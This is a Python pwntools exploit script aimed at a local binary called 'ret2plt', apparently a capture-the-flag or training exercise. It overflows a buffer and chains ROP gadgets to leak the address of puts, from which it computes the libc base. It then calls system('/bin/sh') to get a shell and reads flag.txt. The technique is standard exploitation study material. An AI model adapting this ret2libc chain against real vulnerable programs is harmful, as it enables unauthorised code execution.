#!/usr/bin/env python3

from pwn import *

TARGET = './ret2plt'
context.arch = 'amd64'
# context.log_level = 'debug'

elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

p = process(TARGET)

# Leak address #
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
print(f"pop rdi : {hex(pop_rdi)}")
print(f"ret     : {hex(ret)}")

puts_got = elf.got.puts
puts_plt = elf.plt.puts
print(f"puts@got: {hex(puts_got)}")
print(f"puts@plt: {hex(puts_plt)}")

main = elf.sym.main
vuln = elf.sym.vuln
print(f"main    : {hex(main)}")
print(f"vuln    : {hex(vuln)}")

p1 = b'A' * 32 + b'B' * 8 + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.sendlineafter(b'>> ', p1)

p.recvline()
p.recvline()
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc.address = leak - libc.sym.puts
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
print(f"libc leak: {hex(leak)}")
print(f"libc base: {hex(libc.address)}")
print(f"system() : {hex(system)}")
print(f"/bin/sh  : {hex(binsh)}")

# ret2libc attack #
p2 = b'C' * 32 + b'D' * 8 + p64(ret) * 2 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(p2)

p.sendline(b'ls')
p.sendline(b'cat flag.txt')

p.interactive()
